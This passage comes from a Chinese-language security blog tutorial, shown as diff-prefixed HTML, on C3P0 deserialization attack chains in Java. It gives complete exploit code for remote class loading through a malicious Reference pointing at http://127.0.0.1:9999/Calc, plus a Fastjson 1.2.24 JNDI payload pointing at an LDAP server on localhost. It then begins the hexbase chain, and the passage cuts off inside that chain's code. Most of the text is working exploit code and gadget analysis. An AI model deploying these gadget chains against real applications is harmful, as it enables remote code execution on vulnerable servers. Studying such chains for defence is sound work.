class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在我们拿到的 “ConnectionPoolDataSource” 外表上还是 “ConnectionPoolDataSource”，但是实际上已经变成了 “ReferenceSerialized” 这个类</p>
+<p><font style="color:#080808;background-color:#ffffff;">在</font><code>&lt;font style=&quot;color:#080808;background-color:#ffffff;&quot;&gt;PoolBackedDataSourceBase&lt;/font&gt;</code><font style="color:#080808;background-color:#ffffff;">中被封装的connectionPoolDataSource是一个</font><code>&lt;font style=&quot;color:#080808;background-color:#ffffff;&quot;&gt;ConnectionPoolDataSource&lt;/font&gt;</code><font style="color:#080808;background-color:#ffffff;">类</font></p>
+<p>且在<code>indirectForm</code>封装过程中，调用<code>orig</code>的<code>getReference</code>方法，要继承<code>Referenceable</code>接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> IndirectlySerialized <span class="title function_">indirectForm</span><span class="params">( Object orig )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123; </span><br><span class="line">	<span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> ((Referenceable) orig).getReference();</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceSerialized</span>( ref, name, contextName, environmentProperties );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因此我们要构造一个类，继承<code>getReference</code>和<code>&lt;font style=&quot;color:#080808;background-color:#ffffff;&quot;&gt;ConnectionPoolDataSource&lt;/font&gt;</code><font style="color:#080808;background-color:#ffffff;">接口，并在重写的</font><code>&lt;font style=&quot;color:#080808;background-color:#ffffff;&quot;&gt;getReference&lt;/font&gt;</code><font style="color:#080808;background-color:#ffffff;">方法中构造恶意</font><code>&lt;font style=&quot;color:#080808;background-color:#ffffff;&quot;&gt;Reference&lt;/font&gt;</code></p>
+<p><font style="color:#080808;background-color:#ffffff;">构造好后，需要重写接口类内的方法</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EXP_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:9999/Calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="j8FVX">最终EXP</h5>
+
+<p>new一个<code>PoolBackedDataSourceBase</code>，通过反射将connectionPoolDataSource修改为我们的<code>EXP_Loader</code>，然后在序列化的过程中对connectionPoolDataSource进行封装，最后可以走到<code>if (o instanceof IndirectlySerialized)</code>中，触发恶意代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EXP_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:9999/Calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">sourceBaseClass</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">connectionPoolDataSource</span> <span class="operator">=</span> sourceBaseClass.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        connectionPoolDataSource.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        connectionPoolDataSource.set(poolBackedDataSourceBase, <span class="keyword">new</span> <span class="title class_">EXP_Loader</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(poolBackedDataSourceBase);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="NP8OE">JNDI注入</h3>
+<h4 id="Ly7DN">环境配置</h4>
+
+<p>C3P0的JNDI攻击链，是基于<code>Fastjson</code><font style="color:rgb(80, 80, 92);">依赖的，因此我们需要导入相关依赖</font></p>
+<p><font style="color:rgb(80, 80, 92);">我们需要导入1.2.24版本的，因为在1.2.25中将</font><code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;com.mchange&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">包加入了黑名单</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="aWW6J">JNDI注入流程</h4>
+<h5 id="fewO8">JNDI触发点</h5>
+
+<p>在<code>JndiRefForwardingDataSource</code>的<code>dereference</code>方法中，存在lookup方法</p>
+<p><code>ctx.lookup( (String) jndiName )</code></p>
+<p>这里的jndiName是通过<code>getJndiName</code>方法获取的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> DataSource <span class="title function_">dereference</span><span class="params">()</span> <span class="keyword">throws</span> SQLException</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="type">Object</span> <span class="variable">jndiName</span> <span class="operator">=</span> <span class="built_in">this</span>.getJndiName();</span><br><span class="line">	<span class="type">Hashtable</span> <span class="variable">jndiEnv</span> <span class="operator">=</span> <span class="built_in">this</span>.getJndiEnv();</span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	    &#123;</span><br><span class="line">		InitialContext ctx;</span><br><span class="line">		<span class="keyword">if</span> (jndiEnv != <span class="literal">null</span>)</span><br><span class="line">		    ctx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>( jndiEnv );</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    ctx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">		<span class="keyword">if</span> (jndiName <span class="keyword">instanceof</span> String)</span><br><span class="line">		    <span class="keyword">return</span> (DataSource) ctx.lookup( (String) jndiName );</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (jndiName <span class="keyword">instanceof</span> Name)</span><br><span class="line">		    <span class="keyword">return</span> (DataSource) ctx.lookup( (Name) jndiName );</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Could not find ConnectionPoolDataSource with &quot;</span> +</span><br><span class="line">					   <span class="string">&quot;JNDI name: &quot;</span> + jndiName);</span><br><span class="line">	    &#125;</span><br><span class="line">	......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>getJndiName</code>方法，我们可以看到一些判断，如果jndiName是<code>Name</code>类型，则返回<code>(Name) jndiName).clone()</code>，反之则返回<code>String</code>类型的jndiName</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getJndiName</span><span class="params">()</span></span><br><span class="line">	&#123; <span class="keyword">return</span> (jndiName <span class="keyword">instanceof</span> Name ? ((Name) jndiName).clone() : jndiName <span class="comment">/* String */</span>); &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="KDvsh">调用dereference</h5>
+
+<p>查找该方法的调用处，只有<code>JndiRefForwardingDataSource</code>中的<code>inner</code>方法内调用了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> DataSource <span class="title function_">inner</span><span class="params">()</span> <span class="keyword">throws</span> SQLException</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">if</span> (cachedInner != <span class="literal">null</span>)</span><br><span class="line">	    <span class="keyword">return</span> cachedInner;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">		<span class="type">DataSource</span> <span class="variable">out</span> <span class="operator">=</span> dereference();</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">this</span>.isCaching())</span><br><span class="line">		    cachedInner = out;</span><br><span class="line">		<span class="keyword">return</span> out;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="zxcJe">调用inner</h5>
+继续向上找，我们可以看到一堆的setter与getter方法
+
+<p>看到这里就可以想到fastjson的调用链，满足了fastjson链的调用，我们这里选择<code>setLoginTimeout</code>方法，它只需要我们传入一个整数即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741089858903-68f3d419-1a47-491b-a13f-f8cf9d452d2e.png"></p>
+<h4 id="nNIfX">JNDIEXP构造</h4>
+该EXP构造十分简单，和之前说的fastjson利用链的构造方法一样
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> C3P0;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://127.0.0.1:8085/UpQiYDGn\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里反连地址我没有自己开，可以直接使用yakit工具生成jndi反连地址，最后成功执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741090441099-d6b12de5-ac36-4f5b-a6be-c84d9eb2b54b.png"></p>
+<h3 id="Mv7yR">hexbase攻击链</h3>
+<h4 id="XY97U">分析</h4>
+
+<p>hexBase攻击链能成立的原因是，存在一个<code>WrapperConnectionPoolDataSource</code>类，能它反序列化一串十六进制字符串，首部位于<code>WrapperConnectionPoolDataSource</code>类的构造函数中</p>
+<p>这里使用<code>C3P0ImplUtils.parseUserOverridesAsString</code>方法，对userOverridesAsString进行了操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WrapperConnectionPoolDataSource</span><span class="params">(<span class="type">boolean</span> autoregister)</span></span><br><span class="line">    &#123;</span><br><span class="line">	<span class="built_in">super</span>( autoregister );</span><br><span class="line"></span><br><span class="line">	setUpPropertyListeners();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//set up initial value of userOverrides</span></span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	    &#123; <span class="built_in">this</span>.userOverrides = C3P0ImplUtils.parseUserOverridesAsString( <span class="built_in">this</span>.getUserOverridesAsString() ); &#125;</span><br><span class="line">	<span class="keyword">catch</span> (Exception e)</span><br><span class="line">	    &#123;</span><br><span class="line">		<span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">		    logger.log( MLevel.WARNING, <span class="string">&quot;Failed to parse stringified userOverrides. &quot;</span> + <span class="built_in">this</span>.getUserOverridesAsString(), e );</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//WrapperConnectionPoolDataSource#getUserOverridesAsString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title function_">getUserOverridesAsString</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">    <span class="keyword">return</span> userOverridesAsString; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入到<code>parseUserOverridesAsString</code>方法中，首先对该字符串进行了截取，然后将截取出来的部分转码后存入了serBytes字节数组中</p>
+<p>执行<code>fromByteArray</code>方法时，会调用<code>deserializeFromByteArray</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HASM_HEADER</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line">	<span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">		<span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line">		<span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );</span><br><span class="line">		<span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>SerializableUtils.fromByteArray</code>方法看，里面有一个<code>derserializeFromByteArray</code>方法，继续看它干了什么</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line">	<span class="type">Object</span> <span class="variable">out</span> <span class="operator">=</span> deserializeFromByteArray( bytes ); </span><br><span class="line">	<span class="keyword">if</span> (out <span class="keyword">instanceof</span> IndirectlySerialized)</span><br><span class="line">	    <span class="keyword">return</span> ((IndirectlySerialized) out).getObject();</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以看出来，他将我们的字节组，都写入了一个输入流，然后对其调用了<code>readObject</code>方法，执行了反序列化的操作</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line">	<span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="p2yPj">EXP实现</h4>
+这里的代码直接抄的 师傅的EXP（我太菜了，对于字节数组、流之间的转化，后面会补的>_<）
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 